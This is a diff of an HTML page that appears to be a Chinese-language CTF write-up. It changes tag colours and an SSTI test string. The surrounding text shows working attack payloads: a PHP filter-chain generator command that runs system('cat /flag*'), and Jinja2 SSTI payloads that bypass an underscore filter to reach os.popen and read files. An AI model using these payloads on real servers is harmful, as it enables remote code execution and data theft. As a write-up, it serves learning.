@@ -176,14 +176,14 @@
             
             <span class="tag">
                 
-                <a href="/tags/CTF/" style="color: #ff7d73">
+                <a href="/tags/CTF/" style="color: #03a9f4">
                     CTF
                 </a>
             </span>
             
             <span class="tag">
                 
-                <a href="/tags/CyberSecurity/" style="color: #03a9f4">
+                <a href="/tags/CyberSecurity/" style="color: #ff7d73">
                     CyberSecurity
                 </a>
             </span>
@@ -230,7 +230,7 @@
 <p>可是 👀&#x3D;&#x2F;flag 或者  👀&#x3D;..&#x2F;..&#x2F;..&#x2F;flag.php 等等直接取 flag 的方式全部失敗<br>所以勢必得要 RCE 才能印出 flag 了</p>
 <p>這次攻擊主要採用 PHP filter chain 來達成<br><a target="_blank" rel="noopener" href="https://github.com/synacktiv/php_filter_chain_generator/blob/main/README.md">https://github.com/synacktiv/php_filter_chain_generator/blob/main/README.md</a><br>指令：<code>python3 php_filter_chain_generator.py --chain &quot;&lt;?php system(&#39;cat /flag*&#39;); ?&gt;&quot;</code><br>送到 POST 的 👀 後面變取得 flag</p>
 <p>p.s. 最後我還用了 <code>python3 php_filter_chain_generator.py --chain &quot;&lt;?php system(&#39;ls /&#39;); ?&gt;&quot;</code><br>回頭再看一下爲什麼當初試了快 5 個小時的 ..&#x2F;..&#x2F;flag.php 不管用<br>最後也看到了 flag 檔案有加後綴，所以 path traversal 其實不管用<br><img src="https://hackmd.io/_uploads/S1r4DUe6yx.png" alt="image"></p>
-<h3 id="SSTI-waf1"><a href="#SSTI-waf1" class="headerlink" title="SSTI-waf1"></a>SSTI-waf1</h3><p>一開始先送送看 49 發現真的回應 49<br>那肯定得是個 SSTI 了！</p>
+<h3 id="SSTI-waf1"><a href="#SSTI-waf1" class="headerlink" title="SSTI-waf1"></a>SSTI-waf1</h3><p>一開始先送送看 <code>&#123;&#123;7*7&#125;&#125;</code> 發現真的回應 49<br>那肯定得是個 SSTI 了！</p>
 <p><img src="https://hackmd.io/_uploads/B1xZc0yT1x.png" alt="image"><br>從source發現題目會擋掉 _ 底線<br>所以把底線用 <code>\5f</code> 來繞過<br>並且用 <code>attr</code> 代替 點 來做串接</p>
 <p>一開始先用ls &#x2F; 看根目錄有沒有值得注意的檔案<br><code>&#123;&#123; cycler|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('os')|attr('popen')('ls /')|attr('read')() &#125;&#125;</code><br>發現網頁回應：<br><img src="https://hackmd.io/_uploads/Sk3ycRJ6kx.png" alt="image"></p>
 <p>有 flag 檔案，cat 一下便可以得到解答<br>payload:<br><code>&#123;&#123; cycler|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('os')|attr('popen')('cat /flag')|attr('read')() &#125;&#125;</code></p>
